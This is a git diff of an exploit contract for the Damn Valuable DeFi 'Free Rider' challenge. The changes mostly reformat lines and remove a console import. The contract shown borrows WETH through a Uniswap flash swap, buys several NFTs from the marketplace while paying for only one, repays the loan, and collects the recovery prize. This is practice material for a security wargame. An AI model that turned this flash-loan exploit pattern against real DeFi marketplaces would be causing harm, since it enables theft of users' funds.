@@ -3,7 +3,6 @@ pragma solidity ^0.8.0;
 import "./FreeRiderNFTMarketplace.sol";
 import "./FreeRiderRecovery.sol";
 import "../DamnValuableNFT.sol";
-import "hardhat/console.sol";
 
 interface IUniswapV2Pair {
     function token0() external view returns (address);
@@ -95,7 +94,9 @@ contract AttackFreeRider {
 
         WETH9(token0).withdraw(IERC20(token0).balanceOf(address(this)));
 
-        nftMarketplace.buyMany{value: address(this).balance-FLASH_SWAP_FEE}(tokenIds);
+        nftMarketplace.buyMany{value: address(this).balance - FLASH_SWAP_FEE}(
+            tokenIds
+        );
 
         require(
             DamnValuableNFT(nftMarketplace.token()).balanceOf(address(this)) ==
@@ -104,14 +105,21 @@ contract AttackFreeRider {
         );
 
         WETH9(token0).deposit{value: LOAN_AMOUNT + FLASH_SWAP_FEE}();
-        WETH9(token0).transfer(address(uniswapPair), LOAN_AMOUNT + FLASH_SWAP_FEE);
+        WETH9(token0).transfer(
+            address(uniswapPair),
+            LOAN_AMOUNT + FLASH_SWAP_FEE
+        );
 
         for (uint256 i = 0; i < tokenIds.length; i++) {
-            nft.safeTransferFrom(address(this), address(freeRiderRecovery), i, abi.encode(player));
+            nft.safeTransferFrom(
+                address(this),
+                address(freeRiderRecovery),
+                i,
+                abi.encode(player)
+            );
         }
 
         require(address(this).balance >= PRIZE, "Prize not received!");
-
     }
 
     receive() external payable {}
